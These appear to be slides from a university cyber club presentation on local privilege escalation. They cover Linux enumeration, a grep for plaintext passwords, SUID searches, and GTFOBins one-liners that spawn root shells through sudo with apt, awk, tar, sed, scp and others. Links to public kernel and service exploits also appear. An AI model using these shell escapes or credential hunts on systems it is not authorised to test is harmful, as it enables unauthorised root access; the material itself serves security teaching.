# Local Privilege Escalation

By: Nick Bulischeck

CU Cyber


## You Can Find These Presentations Online

Visit [cucyber.net](https://cucyber.net/) to find these presentations and more online!

<span style="padding-top: 6em; font-size: 0.4em; float: left;">Material: <a href="https://tldrlegal.com/license/creative-commons-attribution-sharealike-4.0-international-(cc-by-sa-4.0)">Creative Commons Attribution-ShareAlike 4.0</a></span><span style="padding-top: 6em; font-size: 0.4em; float: right;">Code: <a href="https://tldrlegal.com/license/bsd-2-clause-license-(freebsd)">BSD 2-Clause</a></span>



## Big Picture


### Information Gathering

* Nmap


### Web Exploitation

* SQL Injection
* Command Injection
* XXE
* LFI/RFI



## Local Privilege Escalation

Privilege escalation is the act of **exploiting a bug**, **design flaw** or **configuration oversight** to gain elevated access to resources that are normally protected from an application or user.


### In essence...

Lower Permissions --Exploit--> Higher Permissions


### Types of Privilege Escalations

* Horizontal - User to User
* Vertical - User to Admin


#### Horizontal

* User A has access to their own bank account
* User B has access to their own bank account
* A vulnerability allows User A to access User B's bank account


#### Vertical

* A buffer overflow exploit in a Windows service running as NT AUTHORITY/SYSTEM allows an unprivileged user account to access an administrator-level command line prompt



### Vertical LPE on Linux

* Enumeration
* Vulnerabilities
 - Kernel Vulnerabilities
 - Service Vulnerabilities
* Misconfigurations
 - Host-based Misconfigurations
 - Service Misconfigurations


#### Enumeration


##### What's the distribution type/version?

* `cat /etc/issue`
* `cat /etc/*-release`
* `cat /etc/lsb-release`    # Debian based
* `cat /etc/redhat-release` # Redhat based


##### What's the kernel version? Is it 64-bit?

* `cat /proc/version`
* `uname -a`
* `uname -mrs`
* `rpm -q kernel`
* `dmesg | grep Linux`
* `ls /boot | grep vmlinuz-`


##### What services are running?

* `ps aux`
* `ps -ef`
* `top`


##### Which service(s) are being run by root?

* `ps aux | grep root`
* `ps -ef | grep root`


##### What applications are installed?

* `ls -alh /usr/bin`
* `ls -alh /sbin`
* `dpkg -l`
* `rpm -qa`
* `pacman -Q`


##### What jobs are scheduled?

* `crontab -l`
* `ls -alh /var/spool/cron`
* `cat /etc/cron*`


##### Are there any plaintext passwords?

* `grep -rnw "pass" /var/www`


#### Vulnerabilities

* Kernel Vulnerabilities
* Service Vulnerabilities


##### Kernel Vulnerabilities

* DirtyCoW

Note:
https://github.com/SecWiki/linux-kernel-exploits


##### Service Vulnerabilities

* Snapd/Dirty Sock (Ubuntu)
* Apport (Ubuntu/Fedora)

Note:
* https://www.exploit-db.com/exploits/46361
* https://www.exploit-db.com/exploits/36746


#### Misconfigurations

* Host-based Misconfigurations
* Service Misconfigurations


##### Host-based Misconfigurations

* Setuid
 - `find / -perm -u=s -type f 2>/dev/null`
* Setgid
 - `find / -perm -g=s -type f 2>/dev/null`
* GTFOBins
* Scheduled Tasks


##### GTFOBins

* apt
 - `sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh`
* awk
 - `awk 'BEGIN {system("/bin/sh")}'`
* mail
 - `sudo mail --exec='!/bin/sh'`
* man
 - `sudo man man`
 - `!/bin/sh`


##### GTFOBins

* sed
 - `sudo sed -n '1e exec bash' 1>&0 /etc/hosts`
* tar
 - `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
* time
 - `/usr/bin/time /bin/sh`


##### GTFOBins

scp

```Bash
TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
scp -S $TF x y:
```


##### Service-based Misconfigurations

* MySQL Running as Root
 - `select sys_exec('whoami');`
 - `select sys_eval('whoami');`
* Apache/Nginx Running as Root
 - If you used a web exploit, you're root!


#### Linux LPE Guides

* [g0tmi1k's Basic Linux Privilege Escalation Guide](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
* [Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html)


#### Linux LPE Scripts

* [LinEnum](https://github.com/rebootuser/LinEnum)
* [LinuxPrivChecker.py](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py)
* [Unix-Privesc-Check](http://pentestmonkey.net/tools/audit/unix-privesc-check)



### Vertical LPE on Windows

* EternalBlue
* Mimikatz



## Questions?
